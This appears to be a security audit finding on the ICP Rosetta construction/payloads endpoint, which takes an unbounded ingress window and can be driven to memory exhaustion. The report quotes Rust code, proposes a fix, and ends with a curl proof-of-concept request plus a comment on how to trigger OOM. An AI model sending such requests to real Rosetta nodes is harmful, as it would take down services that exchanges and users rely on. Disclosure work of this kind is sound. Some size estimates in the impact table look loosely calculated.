### Title
Unbounded Ingress Window in ICP Rosetta `construction_payloads` Causes Memory/CPU Exhaustion — (`rs/rosetta-api/icp/src/request_handler/construction_payloads.rs`)

---

### Summary

The ICP Rosetta `POST /construction/payloads` endpoint accepts caller-controlled `ingress_start` and `ingress_end` metadata values with no upper-bound validation on the window size. The handler loops `while now < ingress_end`, generating one entry per `interval` (120 seconds), and then calls `add_payloads` which emits **2 `SigningPayload` objects per expiry** (one update, one read_state). An unauthenticated attacker can set an arbitrarily large window, causing unbounded memory allocation and CPU consumption on the Rosetta node.

---

### Finding Description

**Constants** (from `rs/limits/src/lib.rs`):
- `MAX_INGRESS_TTL` = 300 s
- `PERMITTED_DRIFT` = 60 s

**Computed interval** in `construction_payloads`:

```
interval = MAX_INGRESS_TTL - PERMITTED_DRIFT - 120s = 120 seconds
``` [1](#0-0) [2](#0-1) 

The ingress window loop has **no upper-bound guard**:

```rust
let mut now = ingress_start;
while now < ingress_end {
    ingress_expiries.push(...);
    now += interval;   // += 120 seconds, no cap
}
``` [3](#0-2) 

`ingress_start` and `ingress_end` are taken directly from caller-supplied metadata with no validation: [4](#0-3) 

`add_payloads` then emits **2 `SigningPayload` entries per expiry** (update + read_state): [5](#0-4) 

**Contrast with ICRC1 Rosetta**, which has minimum-bound checks (`ingress_start >= ingress_end` → error; `ingress_end < now + interval` → error) but also lacks an upper-bound cap — however, ICP Rosetta has **neither** check: [6](#0-5) 

---

### Impact Explanation

| Window | Expiry entries | Signing payloads | Approx. response size |
|---|---|---|---|
| 24 hours | 720 | 1,440 | ~10 MB JSON |
| 30 days | 21,600 | 43,200 | ~300 MB |
| 1 year | 262,800 | 525,600 | ~3.5 GB |
| u64 max | ~∞ | OOM | process crash |

Each `SigningPayload` contains hex-encoded hashes and account identifiers (~150 bytes each). The `UnsignedTransaction` also stores all `ingress_expiries` and `updates` in memory before serialization. A single crafted request with `ingress_end = ingress_start + u64::MAX` would cause an infinite loop until OOM.

The impact is **Rosetta node process crash / OOM DoS**. The IC protocol itself is unaffected, but the Rosetta node — the primary interface used by exchanges and institutional users to interact with the ICP ledger — becomes unavailable.

---

### Likelihood Explanation

- No authentication is required for `POST /construction/payloads`
- The request payload is tiny (two u64 timestamps in JSON metadata)
- The amplification ratio is enormous (small request → gigabytes of server-side allocation)
- Locally testable without any privileged access

---

### Recommendation

Add an upper-bound check on the ingress window before entering the loop:

```rust
const MAX_INGRESS_WINDOW: Duration = Duration::from_secs(24 * 60 * 60); // e.g., 24 hours
if ingress_end > ingress_start + MAX_INGRESS_WINDOW {
    return Err(ApiError::invalid_request(
        "ingress_end - ingress_start exceeds maximum allowed window"
    ));
}
```

Apply the same guard to the ICRC1 Rosetta `construction_payloads` in `rs/rosetta-api/icrc1/src/construction_api/services.rs`. [3](#0-2) [7](#0-6) 

---

### Proof of Concept

```bash
# interval = 120s, so 86400s window → 720 expiries → 1440 signing payloads
NOW_NS=$(date +%s%N)
INGRESS_START=$NOW_NS
INGRESS_END=$(( NOW_NS + 86400000000000 ))  # +24h in nanoseconds

curl -s -X POST http://<rosetta-node>:8080/construction/payloads \
  -H 'Content-Type: application/json' \
  -d "{
    \"network_identifier\": {\"blockchain\":\"Internet Computer\",\"network\":\"00000000000000020101\"},
    \"operations\": [{\"operation_identifier\":{\"index\":0},\"type\":\"START_DISSOLVE\",
      \"account\":{\"address\":\"<account>\"},
      \"metadata\":{\"neuron_index\":0}}],
    \"public_keys\": [{\"hex_bytes\":\"<pubkey>\",\"curve_type\":\"edwards25519\"}],
    \"metadata\": {
      \"ingress_start\": $INGRESS_START,
      \"ingress_end\": $INGRESS_END
    }
  }" | wc -c
# Expected: response >> 10 MB; server RSS spikes proportionally
# Set ingress_end = ingress_start + 10*365*86400*1e9 for OOM
```

### Citations

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L59-60)
```rust
        let interval =
            ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT - Duration::from_secs(120);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L74-84)
```rust
        let ingress_start = meta
            .as_ref()
            .and_then(|meta| meta.ingress_start)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(ic_types::time::current_time);

        let ingress_end = meta
            .as_ref()
            .and_then(|meta| meta.ingress_end)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(|| ingress_start + interval);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L99-107)
```rust
        let mut ingress_expiries = vec![];
        let mut now = ingress_start;
        while now < ingress_end {
            let ingress_expiry = (now
                + ic_limits::MAX_INGRESS_TTL.saturating_sub(ic_limits::PERMITTED_DRIFT))
            .as_nanos_since_unix_epoch();
            ingress_expiries.push(ingress_expiry);
            now += interval;
        }
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L1048-1075)
```rust
fn add_payloads(
    payloads: &mut Vec<SigningPayload>,
    ingress_expiries: &[u64],
    account_identifier: &AccountIdentifier,
    update: &HttpCanisterUpdate,
    signature_type: SignatureType,
) {
    for ingress_expiry in ingress_expiries {
        let mut update = update.clone();
        update.ingress_expiry = *ingress_expiry;
        let message_id = update.id();
        let transaction_payload = SigningPayload {
            address: None,
            account_identifier: Some(account_identifier.clone()),
            hex_bytes: hex::encode(make_sig_data(&message_id)),
            signature_type: Some(signature_type),
        };
        payloads.push(transaction_payload);
        let read_state = make_read_state_from_update(&update);
        let read_state_message_id = MessageId::from(read_state.representation_independent_hash());
        let read_state_payload = SigningPayload {
            address: None,
            account_identifier: Some(account_identifier.clone()),
            hex_bytes: hex::encode(make_sig_data(&read_state_message_id)),
            signature_type: Some(signature_type),
        };
        payloads.push(read_state_payload);
    }
```

**File:** rs/limits/src/lib.rs (L17-21)
```rust
pub const MAX_INGRESS_TTL: Duration = Duration::from_secs(5 * 60); // 5 minutes

/// Duration subtracted from `MAX_INGRESS_TTL` by
/// `expiry_time_from_now()` when creating an ingress message.
pub const PERMITTED_DRIFT: Duration = Duration::from_secs(60);
```

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L148-158)
```rust
    if ingress_start >= ingress_end {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress start should start before ingress end: Start: {ingress_start}, End: {ingress_end}"
        )));
    }

    if ingress_end < now + ingress_interval {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress end should be at least one interval from the current time: Current time: {now}, End: {ingress_end}"
        )));
    }
```

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L162-167)
```rust
    let mut ingress_expiries = vec![];
    while ingress_start < ingress_end {
        ingress_expiries.push(ingress_start + ingress_interval);
        ingress_start +=
            ingress_interval.saturating_sub(INGRESS_INTERVAL_OVERLAP.as_nanos() as u64);
    }
```
